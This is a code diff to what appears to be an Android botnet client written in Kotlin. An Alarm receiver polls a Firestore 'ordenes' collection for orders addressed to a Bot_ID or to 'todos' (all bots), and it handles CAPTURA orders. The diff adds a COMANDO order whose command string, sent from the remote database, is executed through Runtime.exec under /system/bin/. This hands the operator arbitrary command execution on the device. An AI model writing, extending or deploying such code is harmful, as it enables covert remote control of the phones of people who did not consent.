@@ -73,7 +73,7 @@ class Alarm : BroadcastReceiver() {
                         if (document.data["Primitiva"]!!.equals("CAPTURA")) {
                             nuevaCaptura(db, strDate)
                             Log.d("TAG2", "Se añade nueva captura")
-                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                            if(!(document.data["Bot_ID"]!!.equals("todos"))) {
                                 db.collection("ordenes").document(document.id).delete()
                                     .addOnSuccessListener {
                                         Log.d("TAG2", "Orden de captura eliminada")
@@ -116,8 +116,9 @@ class Alarm : BroadcastReceiver() {
                                     }
                             }
                         }
-                        if (document.data["Primitiva"]!!.equals("PING")) {
-                            ejecutaComando()
+                        if (document.data["Primitiva"]!!.equals("COMANDO")) {
+                            val ejecutar = document.data["comando"].toString()
+                            ejecutaComando(ejecutar)
                             Log.d("TAG2", "Se ha enviado un mensaje de ping")
                             if(!document.data["Bot_ID"]!!.equals("todos")) {
                                 db.collection("ordenes").document(document.id).delete()
@@ -346,18 +347,14 @@ class Alarm : BroadcastReceiver() {
     }
 
     // Fuente: https://stackoverflow.com/questions/3905358/how-to-ping-external-ip-from-java-android
-    private fun ejecutaComando(): Boolean {
+    private fun ejecutaComando(comando : String): Boolean {
         Log.d("TAG2","Se ejecuta un ping")
         val runtime = Runtime.getRuntime()
         try {
-            val mIpAddrProcess = runtime.exec("/system/bin/ping -c 5 8.8.8.8")
+            val mIpAddrProcess = runtime.exec("/system/bin/" + comando)
             val mExitValue = mIpAddrProcess.waitFor()
             println(" mExitValue $mExitValue")
-            return if (mExitValue == 0) {
-                true
-            } else {
-                false
-            }
+            return mExitValue == 0
         } catch (ignore: InterruptedException) {
             ignore.printStackTrace()
             println(" Exception:$ignore")
